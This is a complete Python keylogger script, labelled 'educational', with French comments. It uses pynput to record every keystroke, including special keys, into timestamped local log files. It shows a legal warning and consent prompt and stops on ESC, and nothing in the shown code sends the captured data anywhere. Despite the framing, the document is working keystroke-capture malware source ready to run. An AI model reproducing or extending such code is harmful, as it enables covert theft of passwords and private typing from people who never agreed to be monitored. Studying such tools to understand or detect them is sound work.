"""
Educational Keylogger - For Learning Purposes Only

This script demonstrates how keyboard event monitoring works in Python.
WARNING: This is for EDUCATIONAL purposes only. Unauthorized monitoring of 
keyboard activity is illegal. Only use on systems you own or have explicit 
permission to monitor.

Author: Educational Python Script
Purpose: Understanding keyboard event capture mechanisms
"""

import os
import logging
from datetime import datetime
from pynput import keyboard
import threading
import time

# Configuration du logger
LOG_DIR = "logs"
if not os.path.exists(LOG_DIR):
    os.makedirs(LOG_DIR)

LOG_FILE = os.path.join(LOG_DIR, f"keylog_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt")

# Configuration du système de logging
logging.basicConfig(
    filename=LOG_FILE,
    level=logging.INFO,
    format='%(asctime)s - %(message)s',
    datefmt='%Y-%m-%d %H:%M:%S'
)


class EducationalKeylogger:
    """
    Classe principale du keylogger éducatif
    Capture et enregistre les événements clavier pour analyse éducative
    """
    
    def __init__(self, log_file=LOG_FILE):
        """
        Initialisation du keylogger
        
        Args:
            log_file: Chemin du fichier de log
        """
        self.log_file = log_file
        self.current_window = ""
        self.key_buffer = []
        self.buffer_size = 10  # Nombre de touches avant écriture
        self.is_running = False
        self.listener = None
        
        # Écriture du header dans le fichier log
        with open(self.log_file, 'a') as f:
            f.write("\n" + "="*80 + "\n")
            f.write(f"Educational Keylogger Session Started\n")
            f.write(f"Timestamp: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write("="*80 + "\n\n")
    
    def on_press(self, key):
        """
        Fonction callback appelée lors de l'appui sur une touche
        
        Args:
            key: Objet représentant la touche pressée
        """
        try:
            # Récupération du caractère de la touche
            if hasattr(key, 'char') and key.char is not None:
                key_data = key.char
            else:
                # Gestion des touches spéciales
                key_data = self.format_special_key(key)
            
            # Ajout au buffer
            self.key_buffer.append(key_data)
            
            # Écriture si le buffer est plein
            if len(self.key_buffer) >= self.buffer_size:
                self.flush_buffer()
                
        except Exception as e:
            logging.error(f"Error capturing key: {e}")
    
    def format_special_key(self, key):
        """
        Formate les touches spéciales pour un affichage lisible
        
        Args:
            key: Objet touche spéciale
            
        Returns:
            str: Représentation formatée de la touche
        """
        special_keys = {
            keyboard.Key.space: ' ',
            keyboard.Key.enter: '\n[ENTER]\n',
            keyboard.Key.tab: '[TAB]',
            keyboard.Key.backspace: '[BACKSPACE]',
            keyboard.Key.delete: '[DELETE]',
            keyboard.Key.shift: '[SHIFT]',
            keyboard.Key.shift_r: '[SHIFT]',
            keyboard.Key.ctrl: '[CTRL]',
            keyboard.Key.ctrl_r: '[CTRL]',
            keyboard.Key.alt: '[ALT]',
            keyboard.Key.alt_r: '[ALT]',
            keyboard.Key.caps_lock: '[CAPS_LOCK]',
            keyboard.Key.esc: '[ESC]',
            keyboard.Key.up: '[UP]',
            keyboard.Key.down: '[DOWN]',
            keyboard.Key.left: '[LEFT]',
            keyboard.Key.right: '[RIGHT]',
        }
        
        return special_keys.get(key, f'[{str(key).replace("Key.", "")}]')
    
    def flush_buffer(self):
        """
        Écrit le contenu du buffer dans le fichier log
        """
        if self.key_buffer:
            try:
                with open(self.log_file, 'a', encoding='utf-8') as f:
                    f.write(''.join(self.key_buffer))
                self.key_buffer = []
            except Exception as e:
                logging.error(f"Error writing to log file: {e}")
    
    def on_release(self, key):
        """
        Fonction callback appelée lors du relâchement d'une touche
        
        Args:
            key: Objet représentant la touche relâchée
            
        Returns:
            bool: False pour arrêter le listener, True sinon
        """
        # Arrêt du keylogger avec ESC
        if key == keyboard.Key.esc:
            print("\n[INFO] ESC key pressed. Stopping keylogger...")
            return False
        return True
    
    def start(self):
        """
        Démarre le keylogger
        """
        print("\n" + "="*80)
        print("EDUCATIONAL KEYLOGGER - FOR LEARNING PURPOSES ONLY")
        print("="*80)
        print(f"\n[INFO] Keylogger started at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        print(f"[INFO] Logging to: {self.log_file}")
        print("[INFO] Press ESC to stop the keylogger")
        print("[WARNING] Only use this on systems you own or have permission to monitor")
        print("="*80 + "\n")
        
        self.is_running = True
        
        # Création et démarrage du listener
        with keyboard.Listener(
            on_press=self.on_press,
            on_release=self.on_release
        ) as self.listener:
            self.listener.join()
        
        # Écriture finale du buffer
        self.flush_buffer()
        self.is_running = False
        
        # Message de fin
        with open(self.log_file, 'a') as f:
            f.write("\n\n" + "="*80 + "\n")
            f.write(f"Session Ended: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write("="*80 + "\n")
        
        print(f"\n[INFO] Keylogger stopped. Log saved to: {self.log_file}")
    
    def stop(self):
        """
        Arrête le keylogger proprement
        """
        if self.listener:
            self.listener.stop()
        self.flush_buffer()


def display_warning():
    """
    Affiche un avertissement légal avant de démarrer
    """
    print("\n" + "!"*80)
    print("LEGAL WARNING / AVERTISSEMENT LEGAL")
    print("!"*80)
    print("""
This is an EDUCATIONAL tool designed to demonstrate keyboard event monitoring.

IMPORTANT:
- Unauthorized monitoring of keyboard activity is ILLEGAL
- Only use on computers you own or have explicit written permission
- This tool is for learning cybersecurity concepts only
- Misuse may result in criminal prosecution
- The author assumes no liability for misuse

By proceeding, you confirm:
1. You have legal authorization to monitor this system
2. You understand the legal implications
3. You will use this tool responsibly and ethically

Do you understand and accept these terms? (yes/no): """)
    
    response = input().strip().lower()
    return response in ['yes', 'y', 'oui']


def main():
    """
    Fonction principale
    """
    # Affichage de l'avertissement
    if not display_warning():
        print("\n[INFO] User declined terms. Exiting...")
        return
    
    try:
        # Création et démarrage du keylogger
        keylogger = EducationalKeylogger()
        keylogger.start()
        
    except KeyboardInterrupt:
        print("\n[INFO] Interrupted by user (Ctrl+C)")
    except Exception as e:
        print(f"\n[ERROR] An error occurred: {e}")
        logging.error(f"Fatal error: {e}")
    finally:
        print("[INFO] Program terminated")


if __name__ == "__main__":
    main()
